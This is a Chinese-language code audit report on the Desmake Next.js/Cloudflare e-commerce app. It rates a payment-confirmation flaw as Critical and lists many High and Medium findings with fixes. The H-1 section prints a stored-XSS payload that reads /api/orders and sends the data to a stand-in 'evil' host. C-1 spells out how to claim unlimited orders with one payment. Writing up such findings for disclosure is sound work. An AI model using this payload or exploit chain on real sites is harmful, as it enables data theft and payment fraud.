# Desmake 深度代码审计报告 — R1

**审计日期**：2026-09-05
**审计范围**：`project_20260801_215056/projects`（Next.js 16 App Router + @opennextjs/cloudflare 纯 Workers + D1 + R2 + Stripe）
**代码规模**：`src/` 126 个 TS/TSX 文件、15,725 行；30 个 API 路由；34 个 lib 模块
**审计模式**：**严格只读** — 全程仅 Read/Grep/Glob + 只读 Bash（含 Cloudflare API 只读查询）。未创建/修改/删除任何源码文件。
**严重度口径**：**安全 + 功能正确性并重**。Critical = 资金可直接损失 / 可利用漏洞；High = 严重资金或安全风险、功能静默失效。

---

## 一、执行摘要

本轮对 10 个功能域做了并行深度审计 + 主审计员源码复核。整体判断：

> **代码的"主干防线"是扎实的** —— 密码学原语正确、SQL 全程参数化、上传类型白名单严格、Stripe 服务端下单与验签齐备、金额语义自洽、历史 P0（跨实例索引失效、缓存中毒、运费重复计费、Stripe fallback）经复核**确已真修**。
>
> **但存在 1 个可直接造成资金损失的 Critical 漏洞，以及 14 个 High 级问题。**

### 最关键的三个问题

| # | 问题 | 影响 | 证据 |
|---|------|------|------|
| **C-1** | **支付确认未把 PaymentIntent 与订单绑定** | 一笔真实付款可套取**任意多个**同金额订单 → 平台承担全部制造/物流成本 + 创作者分成照付 | `payments/confirm/route.ts:100-128` |
| **H-1** | **创作者资料 JSON-LD 存储型 XSS**（CSP 无法缓解） | 任意登录用户可在自己的公开主页植入脚本，攻击所有访客 | `JsonLd.tsx:13` + `creators/[handle]/page.tsx:59-69` + `next.config.ts:42` |
| **H-2** | **收益写入非原子 + 无唯一约束** | confirm 与 webhook 并发 → 分成重复入账 → 月结**翻倍打款**给创作者 | `stores.ts:501-508,682-689` + `db.ts:169-181` |

### 一个"实现了但生产未生效"的隐蔽问题

**交易邮件在生产环境是空操作**：`email.ts:7` 依赖 `RESEND_API_KEY`，而该 key **不在已部署的 Worker secret 列表中**（经 Cloudflare API 实测确认，共 10 个 secret，无此 key）。这意味着下单确认邮件、邮箱验证邮件全部静默不发送 —— 代码写对了，但线上没接线。

---

## 二、审计方法与范围

### 审计域划分（10 域）

| # | 域 | 覆盖 | 执行方式 |
|---|-----|------|---------|
| 1 | 认证与会话 | `session.ts`、6 个 auth 路由、profile | 并行 agent |
| 2 | 支付与资金 | `stripe.ts`、`pricing.ts`、`data.ts`、payments/*、admin/settle | 并行 agent |
| 3 | 订单与履约 | orders/*、listings/*、cart | 主审计员直读（agent 遇平台限流） |
| 4 | 分成与推荐 | `stores.ts` 收益表、ref、earnings、tracking | 并行 agent |
| 5 | D1 数据层与跨实例 | `db.ts`、`stores.ts`、`catalogIndex/Version` | 并行 agent |
| 6 | AI 生成与异步任务 | `ai.ts`、generate/* | 并行 agent |
| 7 | R2 上传 / CDN / 访问控制 | `r2.ts`、upload、cdn/*、`image-loader.ts` | 并行 agent |
| 8 | API 面加固（30 路由） | 全部 `api/**/route.ts`、`ratelimit.ts` | 主审计员直读（agent 遇平台限流） |
| 9 | 前端渲染与 XSS | `Markdown.tsx`、`JsonLd`、CSP、consent | 主审计员直读（agent 遇平台限流） |
| 10 | 配置 / 密钥 / 合规 | `wrangler.jsonc`、`next.config.ts`、`email.ts`、合规页 | 主审计员直读（agent 遇平台限流） |

> **说明**：原计划 10 个 agent 并行，其中 4 个因平台 429 频率限制启动失败（重置时间 2026-09-06 09:48）。这 4 个域（3/8/9/10）由主审计员**亲自直接读源码**补齐，方法一致、证据口径一致。

### 主审计员独立核验（trust but verify）

对全部 Critical 与关键 High，**逐条亲自打开源码复核**，未采信 agent 的"已修复"结论。以下结论经本人直接验证：

- ✅ C-1 已亲自读 `confirm/route.ts:100-128` + `payments/route.ts:63-73` + `orders/route.ts:276`，**攻击链完整成立**
- ✅ H-1 已亲自读 `JsonLd.tsx:13` + `creators/[handle]/page.tsx:59-69` + `/api/profile:20-31` + `next.config.ts:42`，**四段代码串成完整利用链**
- ✅ H-6（邮件失效）已通过 Cloudflare API 列出线上 secret 实测确认
- ✅ H-13（SESSION_SECRET）已通过 Cloudflare API 确认线上**已绑定**，据此将其从 Critical 降级为 High

---

## 三、严重度分布

| 严重度 | 数量 | 说明 |
|--------|------|------|
| **Critical** | **1** | 资金可直接损失 |
| **High** | **14** | 严重资金/安全风险、功能静默失效 |
| **Medium** | **14** | 性能、健壮性、合规瑕疵 |
| **Low / Info** | **8** |  hardening 建议 |
| 不适用 (N/A) | 1 | 库存超卖（业务为按需印制，无库存概念） |

---

## 四、前轮修复核验表（回归检查）

前几轮声称已修复的项目，本轮逐条复核：

| 前轮修复项 | 状态 | 核验证据 |
|-----------|------|---------|
| 跨实例目录索引失效（`catalogVersion` 模块级变量） | ✅ **真修** | 已改为 D1 `catalog_meta` 共享版本 + `ON CONFLICT DO UPDATE` 原子自增（`catalogVersion.ts:28-70`）；残留 1s TTL 镜像属有界延迟 |
| 全量 D1 blob 重扫（目录索引路径） | ✅ **目录路径已修** | `catalogIndexRows()` 用 `json_extract` 投影 + `globalThis` 缓存 + single-flight（`catalogIndex.ts:80-119`） |
| Stripe 不可用时拒绝免费 markPaid（P0-4） | ✅ **真修** | `confirm/route.ts:143-150` 生产无网关返回 503，绝不免费确认 |
| 运费重复计费（P0-1） | ✅ **真修** | `computeOrderTotals` `shippingCents=0`，`taxCents=sale-retail`，`total=saleSubtotal`，无重复累加 |
| 会话跨实例断裂（P0-3） | ✅ **真修** | 无状态 HMAC-SHA256 签名 cookie，跨 isolate 可验（`session.ts:303-329`） |
| 退款/拒付冲销（P0-5） | ✅ **部分** | webhook 处理 `charge.refunded`/`dispute.created` 并调 `reverseEarningsForOrder`；**但已结算(paid)后退款不追扣 → H-3** |
| 推荐反欺诈三条硬规则 | ✅ **已落实** | 自推置空(`orders:80`+`stores:652`)、owner==referrer 不双计(`stores:653`)、email_verified 门槛(`stores:628-646`)、月度封顶按月累计(`stores:637-641`) |
| 1 年缓存中毒（`s-maxage=31536000`） | ✅ **已解决** | 改为 ISR `revalidate=600`；线上实测 `/` → `s-maxage=600`，`/sitemap.xml`、`/robots.txt` → `max-age=0, must-revalidate`。关键 SEO 路由保留 `force-dynamic`（`robots.ts:5`、`sitemap.ts:11`、`llms*.txt`） |
| 交易邮件 | ⚠️ **代码有、生产未生效** | `sendOrderConfirmationEmail` 已实现并被调用，但 `RESEND_API_KEY` 未配置 → 线上空操作（**H-6**） |
| 限流（rate limiting） | ⚠️ **覆盖不足** | 仅 7/30 路由接入（**M-1**） |
| `wrangler.jsonc` 残留 `deleted_classes` 迁移 | ✅ **已清理** | 当前无 `migrations` 块 |

---

## 五、新发现

### 🔴 Critical

#### C-1｜支付确认未绑定 PaymentIntent 与订单 → 一付多单（资金直接损失）

- **期望**：`confirm` 必须验证 `intent.metadata.order_id === orderId`，确保该 PaymentIntent 就是为**这个**订单创建的。
- **实际**：仅校验 `status`(108)、`amount`+`currency`(114-122)、以及 `order.payment.payment_intent_id` 是否匹配(124)。**从未读取 `intent.metadata.order_id`**。而第 124 行的守卫在 `order.payment.payment_intent_id` 为 `null` 时被**整体跳过**。

**完整攻击链（已逐段源码验证）**：
1. 攻击者注册并创建订单 O1（金额 $X）
2. 走 `/api/payments` → 创建 intent `I1`，`metadata.order_id = O1`（`payments/route.ts:67`），并回写 `O1.payment.payment_intent_id = I1`（`:70-72`）
3. 支付 I1 → `succeeded`；确认 O1 → 正常完成
4. 创建新订单 O2（同金额 $X）→ **不调用 `/api/payments`** → `O2.payment.payment_intent_id` 保持 `null`（`orders/route.ts:276`）
5. `POST /api/payments/confirm {order_id: O2, payment_intent_id: I1}`
   - `order.user_id === user.id` ✓（`:82`）
   - `status === "pending"` ✓（`:85`）
   - `intent.status === "succeeded"` ✓（`:108`）
   - `intent.amount === O2.total_cents` ✓（`:116`）
   - `order.payment.payment_intent_id` 为 null → **守卫跳过** ✓（`:124`）
   - → `markPaid(O2, I1, I1)` → **O2 免费变已支付**，写入创作者/推荐分成，订单进入履约
6. 对 O3…On 重复步骤 5 —— **一笔付款套取无限个订单**

- **证据**：
  - `src/app/api/payments/confirm/route.ts:100-128`
  - `src/app/api/payments/route.ts:63-73`（intent 含 `metadata.order_id`，且回写落库）
  - `src/app/api/orders/route.ts:276`（新建订单 `payment_intent_id: null`）
- **修复**：在金额校验后（`:122` 之后）增加一行：
  ```ts
  if (intent.metadata?.order_id !== orderId) {
    return NextResponse.json({ error: { code: "intent_order_mismatch", message: "Payment intent does not belong to this order" } }, { status: 409 });
  }
  ```
  并建议同时把第 124 行改为"若订单已有 intent 且不匹配则拒绝；若为 null 则强制要求 metadata 匹配"。

---

### 🟠 High（14 项）

#### H-1｜创作者资料 JSON-LD 存储型 XSS（CSP 无法缓解）

- **期望**：用户可控内容进入 JSON-LD 前必须转义，或 CSP 阻止内联脚本。
- **实际**：四段代码串成完整利用链——
  1. `/api/profile:21-24` 任意登录用户可自设 `bio`(≤280)、`name`(≤80)、`city`(≤80)、`roleTag`(≤60)，**仅限制长度，无任何内容净化**
  2. `creators/[handle]/page.tsx:59-69` 把这些字段直接塞进 `personLd`（`name`/`description: creator.bio`/`jobTitle`/`homeLocation.name`）
  3. `JsonLd.tsx:13` `dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }}` —— **`JSON.stringify` 不转义 `</script>`**
  4. `next.config.ts:42` CSP 为 `script-src 'self' 'unsafe-inline' https://js.stripe.com` —— **允许内联脚本，CSP 不提供任何缓解**

- **利用**：`bio = </script><script>fetch('/api/orders').then(r=>r.json()).then(d=>fetch('//evil/?x='+btoa(JSON.stringify(d))))</script>`（<280 字符）→ 任何访问 `/creators/<handle>` 的访客执行攻击者脚本。
- **缓解因素**：会话 cookie 为 `httpOnly`，无法直接窃取 token；但仍可代受害者发起已认证请求、钓鱼、篡改页面。
- **修复**（任一即可，建议全做）：
  - `JsonLd.tsx` 输出前转义：`JSON.stringify(data).replace(/</g, "\\u003c")`
  - 收紧 CSP：移除 `'unsafe-inline'`（改用 nonce/hash），并补 `object-src 'none'`、`base-uri 'none'`

---

#### H-2｜收益写入非原子 + 无唯一约束 → 并发重复入账（分成翻倍打款）

- **期望**：同一订单的收益行只能存在一份。
- **实际**：`recordOrderEarnings`/`recordReferralEarnings` 用「先 `DELETE WHERE order_id=?` 再 `INSERT`」实现幂等，但该序列**非原子**；D1 两张收益表**仅 `id` 为主键，`order_id` 无唯一约束**。
- **触发**：`confirm:85`（`status !== "pending"` 拒绝）与 `webhook:43`（`status === "pending"` 才写）存在 TOCTOU 窗口，两者并发时各自越过守卫，各写一份。
- **后果**：月结 `admin/settle:50-58` 的 `UPDATE … SET status='paid' WHERE status='pending'` 会把两份都翻成 paid → **创作者/推荐人分成翻倍打款**。
- **证据**：`stores.ts:501-508`、`stores.ts:682-689`、`db.ts:169-181`；并发入口 `confirm/route.ts:85` 与 `webhook/route.ts:43`
- **注**：**支付域与数据层域两个 agent 独立命中同一问题**，可信度高。
- **修复**：D1 加 `UNIQUE(order_id)`（或 `UNIQUE(order_id, line_index)`）+ `INSERT … ON CONFLICT DO NOTHING`；写入收口到 `db.batch()` 事务。

---

#### H-3｜已结算（paid）后退款不追扣

- **实际**：`reverseEarningsForOrder` 仅翻 `status='pending' → 'reversed'`（`stores.ts:716-717` 的 `WHERE status='pending'`）。一旦 `admin/settle` 已翻为 `paid`，后续 `charge.refunded` 到达时该行已非 pending，**不被冲销，已打款金额无法追回**。
- **证据**：`stores.ts:700-721`、`webhook/route.ts:71-86`
- **修复**：对已 paid 行生成负值冲销行或记应收账款，在下次结算时抵扣。

---

#### H-4｜两处 SSRF（服务端/边缘代理任意 URL 拉取）

**H-4a｜`/api/designs` 服务端 fetch 任意 URL 并落地 R2**
- `designs/route.ts:60-81`：`resolveAiImage(body.imageUrl)` 的 `http(s)` 分支对**客户端传入的任意 URL** 直接 `fetch`，且以**响应头的 `content-type`** 作为入库类型（攻击者可控），字节完全落入 R2。
- 攻击者（任意登录用户）可驱动 Worker 向外网/内网发起请求。

**H-4b｜上传型发布存任意外链 → Image Resizing 开放代理**
- `designs/route.ts:115`：`source:"upload"` 时 `imageUrl` 直接采信客户端（≤6000 字符，无校验）。
- `image-loader.ts:8,17` 自定义 loader 对非 `/` 开头的 src **原样拼接**成 `/cdn-cgi/image/<opts>/<绝对URL>`，Cloudflare Image Resizing 会**服务端拉取该绝对 URL** → 存储型 SSRF / 开放代理。
- **修复**：H-4a 加 Agnes 域名白名单；H-4b 强制 `imageUrl` 必须以同源 `/cdn/` 开头，否则拒绝。

---

#### H-5｜`/cdn/[...key]` 零访问控制（私有文件靠"URL 不可猜"伪保护）

- **实际**：`cdn/[...key]/route.ts:12-26` 对任意 key **无登录校验、无前缀白名单、无归属校验**，且返回 `cache-control: public, max-age=31536000, immutable` —— 一旦被访问即在边缘节点公开缓存一年。
- 桶为单 bucket 共享（`uploads/<userId>/` 与 `ai/` 混用），任何人拿到 URL 即可读取他人上传/AI 图。当前仅依赖 `newId` 的 64-bit 熵**不可枚举**，属伪访问控制。
- **证据**：`cdn/[...key]/route.ts:12-26`、`r2.ts:23`
- **修复**：加前缀白名单（仅 `uploads/`、`ai/`）+ 对 `uploads/<userId>/` 做归属校验，或改为默认 `private` 缓存 + 签名访问。

---

#### H-6｜交易邮件在生产环境是空操作（`RESEND_API_KEY` 未配置）

- **实际**：`email.ts:7` `EMAIL_ENABLED = Boolean(process.env.RESEND_API_KEY)`。
- **经 Cloudflare API 实测，已部署 secret 共 10 个**：`ADMIN_TOKEN`、`AGNES_API_KEY`、`CMS_API_KEY`、`D1_CF_API_TOKEN`、`D1_DATABASE_ID`、`R2_S3_ACCESS_KEY_ID`、`R2_S3_SECRET_ACCESS_KEY`、`SESSION_SECRET`、`STRIPE_SECRET_KEY`、`STRIPE_WEBHOOK_SECRET` —— **无 `RESEND_API_KEY`**。
- **后果**：下单确认邮件、邮箱验证邮件**全部静默不发送**。用户无订单凭证；注册不验证邮箱（见 H-8）；且 `register/route.ts:80,86` 在发送失败时会把**验证链接直接回传响应体**兜底（见 M-12）。
- **修复**：`wrangler secret put RESEND_API_KEY`，并加启动自检：生产环境邮件不可用时告警。

---

#### H-7｜会话无法失效（登出/改密/删号后令牌仍有效 7 天）

- **实际**：令牌为无状态签名 cookie，`destroySession`(`session.ts:331-336`) 只执行 `DELETE FROM sessions WHERE token=?`，而**新设计从不向 `sessions` 表写行** → 该删除是空操作（代码注释亦承认"nothing to invalidate"）。`logout/route.ts:6-10` 仅清客户端 cookie。
- **后果**：令牌泄漏后 7 天 TTL 内无法撤销；全仓**不存在改密码/删账户端点**。
- **证据**：`session.ts:331-336`、`logout/route.ts:6-10`
- **修复**：引入会话版本号（写 D1，校验时比对）或吊销表；补改密码端点并在改密后 bump 版本。

---

#### H-8｜邮箱验证不强制（形同虚设）

- **实际**：`register/route.ts:69-89` 创建账号后**立即签发会话并登录**，无需验证。`orders/route.ts:51-54`、`earnings/route.ts:9-12` 仅校验 `getSession`，**不校验 `emailVerified`**。
- **后果**：未验证邮箱的账号可立即下单、查看收益、触发付费 AI 生图（`generate` 只要求登录）。注册零门槛 → 批量小号可放大 H-10 的成本风险。
- **证据**：`register/route.ts:69-89`、`orders/route.ts:51-54`、`earnings/route.ts:9-12`
- **修复**：对下单/生图/收益等敏感操作强制 `emailVerified`；并先修好 H-6 让验证邮件真能发出。

---

#### H-9｜分成/冲销写路径静默吞错（可致多打款）

- `stores.ts:509-511`、`stores.ts:690-692`：收益写入 `catch` 仅 `console.error` → D1 失败则**分成静默丢失**，无人付款。
- `stores.ts:718-720`：`reverseEarningsForOrder` 失败但**内存已标 `reversed`**，D1 仍为 `pending` → **退款订单的分成可能被月结打款发出**（多付款）。
- **修复**：写路径失败必须抛错并触发告警/重试，不能只打日志。

---

#### H-10｜AI 生图免计量、无配额、无成本上限

- `generate/route.ts:23` 限流仅 **6 次/分钟/IP/实例**（`ratelimit.ts` 自述 per-instance，多实例可放大 N 倍），且按 IP 而非按用户。
- `generate/route.ts:101-103` 注释明确"不扣 credits"。**无任何 per-user 配额、无全局成本上限、无账单封顶**。
- 在 H-8（注册无需验证）叠加下，批量注册小号即可近乎无限触发付费生图 → **账单爆炸风险**。
- **对外宣称与实现不符**：`/agents/page.tsx:63` 宣称 "per-key metering and a full audit trail"，本域内**无对应实现** → 存在虚假宣传/合规风险。
- **修复**：加 per-user 配额与全局月度成本上限；未计量前移除 `/agents` 页面的相关宣称。

---

#### H-11｜生成任务无 `waitUntil`/队列 + 轮询无超时 → 永久 pending

- `generate/route.ts:75` 后台任务为 `void (async () => {...})()` fire-and-forget，**未包裹 `ctx.waitUntil`**，也无 Durable Object/队列。代码依赖"容器常驻"规避 edge 隔离 —— 任何容器回收/重启都会丢失在途任务。
- `[id]/route.ts:44-64` 轮询**无超时、无最大尝试次数**，非 failed 且无 outputs 时永远返回 `queued`（progress 封顶 92）。
- **后果**：容器抖动即产生孤儿 job → D1 里永远是 queued → 前端 `studio/page.tsx:266-303` 每 700ms 无限转圈。
- **注**：上游 fetch 均带 `AbortSignal.timeout`（`ai.ts:55/83`），不会挂死 ✅。
- **修复**：改 `waitUntil` 或引入队列；轮询加超时并在超时后翻转 failed。

---

#### H-12｜Image Resizing 无降级/容错（全站图片 404 单点故障）

- `image-loader.ts:13-17` 在 production 直接生成 `/cdn-cgi/image/...`，**无健康检查、无降级分支**。依赖 zone `image_resizing` 开启 + R2 授权为源。
- 未开启 → **全站图片 404**（历史已发生过此事故）；R2 对象被删 → 链式 404，无原图或 `Artwork` 占位兜底（仅有前端组件级 `onError`）。
- **修复**：loader 层加回退（原图 `/cdn/...` 或占位）；加启动/定时健康检查。

---

#### H-13｜`SESSION_SECRET` fail-open 设计（**当前线上已绑定，暂不可利用**）

- `session.ts:289`：`process.env.SESSION_SECRET || "desmake-dev-insecure-session-secret"` —— 缺失时**仅 `console.error` 告警，不拒绝启动**，回退到硬编码的公开默认密钥，攻击者可据此伪造任意用户会话。
- **缓解事实**：经 Cloudflare API 实测，**生产已绑定 `SESSION_SECRET`** → 当前**不可利用**。故从 Critical 降级为 High。
- **残留风险**：换环境、新建预览部署、或 secret 被误删时**静默沦陷**，无任何强制失败信号。
- **修复**：生产缺失时 `throw`/拒绝服务，而非告警继续。

---

#### H-14｜推荐月度封顶 TOCTOU + `email_verified` 网关 fail-open

- **TOCTOU**：`stores.ts:637-658` 在循环前一次性 `SELECT SUM(commission_cents)`，随后在内存累加判断。同一推荐人两笔并发订单若都在写库前读到 `<5000`，均可写入 → 超发佣金。
- **fail-open**：`stores.ts:628` `let referrerVerified = true`（**默认放行**），仅 `D1_ENABLED` 才查库，且 `catch` 后仍为真 → 查库异常时允许未验证推荐人入账。
- **修复**：封顶改单条事务/原子 `UPDATE … WHERE (SELECT SUM…) < cap`；`referrerVerified` 默认改为 `false`。

---

### 🟡 Medium（14 项）

| # | 问题 | 证据 |
|---|------|------|
| M-1 | **限流仅覆盖 7/30 路由**：仅 `ref`(120)、`payments`(20)、`payments/confirm`(30)、`orders`(20)、`auth/register`(10)、`auth/login`(10)、`generate`(6)。`upload`、`designs`、`cms/posts`、`admin/settle`、`analytics`、`events`、`profile`、`earnings`、`share/links`、`adapters` 等**均无限流** | `ratelimit.ts` + grep |
| M-2 | 限流为**每实例内存 Map**（多实例下可放大 N 倍，注释自承），且按 IP 计；`clientIp` 缺失 `cf-connecting-ip` 时回退可伪造的 `X-Forwarded-For` | `ratelimit.ts:1-39` |
| M-3 | `allPublishedDesigns()` **仍全表 blob 扫描**（`SELECT data FROM designs`，~5MB + 逐行 JSON.parse），被创作者页/仪表盘/下单回源反复调用，**未复用已建好的内存索引** | `stores.ts:220`、`creators.ts:49,56,72` |
| M-4 | `ensureSchema` 的 `ensureOne` **吞掉所有 CREATE/ALTER 错误**并标记 ready → schema 半残仍服务（静默降级）；**无迁移系统**，13 条 `ALTER TABLE users ADD COLUMN` 每次冷启动都跑，稳定刷 13 条假 FAILED 日志，**淹没真实故障信号** | `db.ts:68-77,147-162` |
| M-5 | 生成图**不入 R2**，仅存上游 URL 或 base64 → 上游链接过期即死链；`b64_json` 会以巨大 base64 塞进 D1 行，膨胀存储 | `ai.ts:67`、`route.ts:79-86` |
| M-6 | 注册对已存在邮箱返回 `409 "An account with this email already exists"` → **账户枚举** | `register/route.ts:40-45` |
| M-7 | 上传/AI 图**不校验 magic bytes**，信任声明的 content-type / 响应头 → 可把任意字节伪装成图片入库（因同源 `image/*` + 全局 `nosniff`，不直接导致执行） | `upload/route.ts:41-44`、`designs/route.ts:47-48,63-67` |
| M-8 | **R2 无删除逻辑**（全仓无 `bucket.delete`），设计改图/重发产生孤儿对象，**存储成本只增不减** | grep 无命中 |
| M-9 | 漏配 `AGNES_API_KEY` 时**静默降级为"假 AI 图"**（确定性合成的预览图），用户**无任何提示**以为拿到真 AI 图 | `generate/route.ts:67`、`generate/[id]/route.ts:71-85` |
| M-10 | 退款事件乱序（`charge.refunded` 早于 `payment_intent.succeeded` 到达）→ 冲销时收益尚未写入为 no-op，随后写入的收益**永不冲销** | `webhook/route.ts:38-43,68-86` |
| M-11 | 创作者自购自身设计**仍计 royalty**（钱从左兜到右兜，平台白让 margin） | `stores.ts:472-492` |
| M-12 | 邮件发送失败时，**邮箱验证链接直接回传在 201 响应体** `email_verification_link` 字段（配合 H-6，生产常态触发） | `register/route.ts:80,86` |
| M-13 | CSP 缺 `object-src 'none'`、`base-uri 'none'`、`form-action`、HSTS、Permissions-Policy；且 `connect-src` 未含 GA4/Meta/Cloudflare Insights → **客户端分析请求被 CSP 阻断**（线上已观测到 cloudflareinsights 被拦的 console 错误） | `next.config.ts:28-49` |
| M-14 | `admin/settle` 的 `token !== ADMIN_TOKEN` 为普通不等比较，非恒定时间 | `settle/route.ts:14` |

---

### 🔵 Low / Info（8 项）

1. Cookie 缺 `__Host-`/`__Secure-` 前缀；`secure` 仅在 `NODE_ENV==="production"` 时置位（`session.ts:52,59`）
2. `scrypt` 使用默认成本参数（N=16384），未显式调高（`session.ts:78`）
3. 封顶为软上限：累计 4999 + 新行 100 仍写入（封顶变成"≤5000+单行"）（`stores.ts:657-658`）
4. 封顶 `SUM` 未排除 `reversed` 行 → 退款后仍占用推荐人当月额度（`stores.ts:637-641`）
5. `getFromR2` 写入用原始 key、读取时再 `encodeURIComponent` → 编码往返不一致隐患（`r2.ts:37` vs `r2.ts:52`）
6. CAPI 向 Meta 发送买家邮箱 SHA256（`capi.ts:27-28`）→ PII 出境，建议确认隐私政策已告知
7. `GOOGLE_SITE_VERIFICATION` / `BING_SITE_VERIFICATION` 仍未配置（SEO 待办，非阻塞）
8. 无全局 `middleware.ts`，各路由各自鉴权（当前各路由均已检查，属纵深防御缺失而非漏洞）

---

### ⚪ 不适用（N/A）

**库存超卖**：业务模式为**按需印制（POD）**——"Nothing is made until it is sold"、"no inventory, ever"（`about/page.tsx:18,58` 等多处）。系统中**不存在库存概念**，因此超卖风险不适用。前轮提及的"库存超卖"应指其它语义，本轮未发现可复现的库存相关问题。

---

## 六、跨域共识（多域独立命中，可信度更高）

以下问题被**两个及以上审计域独立发现**，交叉验证后可信度显著提升：

| 问题 | 命中域 | 结论 |
|------|--------|------|
| 收益写入非原子 + 无唯一约束 → 重复入账 | 支付资金域、D1 数据层域 | **H-2**，确认为真 |
| 推荐月度封顶读改写竞态 | 分成推荐域、D1 数据层域 | **H-14**，确认为真 |
| 分成写路径 `catch` 静默吞错 | 分成推荐域、D1 数据层域 | **H-9**，确认为真 |
| 上传/发布接口无限流 | R2 存储域、API 加固域 | **M-1**，确认为真 |
| 限流 per-instance 内存实现无效 | 认证域、API 加固域 | **M-2**，确认为真 |
| `SESSION_SECRET` 硬编码默认值 | 认证域、AI 生成域 | **H-13**，确认为真（线上已绑定，降级） |

---

## 七、修复路线图

### P0 — 立即修复（资金/安全，本周内）

| 项 | 修复动作 | 工作量 |
|----|---------|--------|
| **C-1** | `confirm/route.ts` 增加 `intent.metadata?.order_id !== orderId → 409`；并把 `:124` 守卫改为"intent 为 null 时强制要求 metadata 匹配" | ~5 行 |
| **H-1** | `JsonLd.tsx` 输出前 `.replace(/</g, "\\u003c")`；CSP 移除 `'unsafe-inline'`（改 nonce）+ 补 `object-src 'none'`、`base-uri 'none'` | ~10 行 |
| **H-2** | D1 收益表加 `UNIQUE(order_id)` + `INSERT … ON CONFLICT DO NOTHING`；写入收口 `db.batch()` | 小 |
| **H-4** | `resolveAiImage` 加 Agnes 域名白名单；`source:"upload"` 强制 `imageUrl` 以同源 `/cdn/` 开头 | ~15 行 |
| **H-6** | `wrangler secret put RESEND_API_KEY` + 加启动自检告警 | 配置 |

### P1 — 尽快修复（1–2 周）

- **H-3** 已结算后退款的冲销（负值冲销行 / 应收账款）
- **H-5** `/cdn` 前缀白名单 + 归属校验（或改私有缓存）
- **H-7** 会话版本号/吊销表 + 补改密码端点
- **H-8** 敏感操作强制 `emailVerified`
- **H-9** 写路径失败必须抛错告警，不得静默吞
- **H-10** per-user 生图配额 + 全局成本上限；同步修正 `/agents` 页面宣称
- **H-13** `SESSION_SECRET` 缺失时拒绝启动
- **H-14** 封顶改原子写入；`referrerVerified` 默认改 `false`

### P2 — 计划修复（1 个月内）

- **H-11** 后台任务改 `waitUntil`/队列 + 轮询超时
- **H-12** Image Resizing 降级回退
- **M-1 / M-2** 限流覆盖到全部写路由；改共享存储（D1/KV）实现全局限流
- **M-3** 创作者/下单路径复用内存索引，消灭全表扫描
- **M-4** `ensureSchema` 改幂等（`PRAGMA table_info` 探测）或接入 wrangler migrations；失败必须暴露
- **M-10** webhook 在 `succeeded` 时校验订单是否已被退款/争议

### P3 — 技术债 / hardening

- M-5 ~ M-14、全部 Low 项
- 邮件/支付/生图加端到端可观测（当前多处静默失败无告警）

---

## 八、方法说明与限制

### 方法
1. 读取项目记忆锚定前轮结论与待修复项（`.workbuddy/memory/MEMORY.md` + 当日日志）
2. 建立只读基线：`git status --porcelain` = **124 个改动文件，校验和 `95dd702dbd4fbf7d0a2e2fc824ae75f1`**
3. 设计 10 个功能域，并行派发审计 agent（6 个成功，4 个因平台 429 限流失败后由主审计员亲自直读补齐）
4. **trust but verify**：主审计员对全部 Critical 与关键 High 亲自打开源码逐行复核，未采信任何 agent 的"已修复"结论
5. 通过 Cloudflare API 只读查询线上实际绑定（worker secrets），用于区分"代码有缺陷"与"生产已可利用"
6. 通过 `curl -sI` 实测线上缓存头，验证历史缓存中毒修复是否回归

### 限制
- **未做动态/渗透测试**：本轮为静态源码审计 + 只读配置核验。C-1、H-1 的利用链为源码级推导（已逐段验证代码路径成立），**未在线上实际执行攻击验证**（避免造成真实资金损失/污染生产数据）。
- 4 个域由主审计员直读完成，虽方法一致，但覆盖深度可能略低于专职 agent 的穷举式扫描；`Markdown.tsx` 博客渲染器仅做了 `dangerouslySetInnerHTML` 全局扫描（命中 0），未逐行审计其转义逻辑。
- 未审计 `node_modules`、构建产物、`.open-next/`；
- 未审计前端客户端 bundle 实际产物（仅审计源码）；
- 未做性能压测（性能结论为代码级推导）。

### 零改动验证
审计结束时复核 `git status --porcelain`：**校验和必须与基线 `95dd702dbd4fbf7d0a2e2fc824ae75f1` 完全一致**，源码零改动。唯一新增为本报告文件（新增未跟踪文件，非修改）。

---

*报告生成：2026-09-05 | 严格只读审计 | 所有结论均附 `文件:行号` 证据*
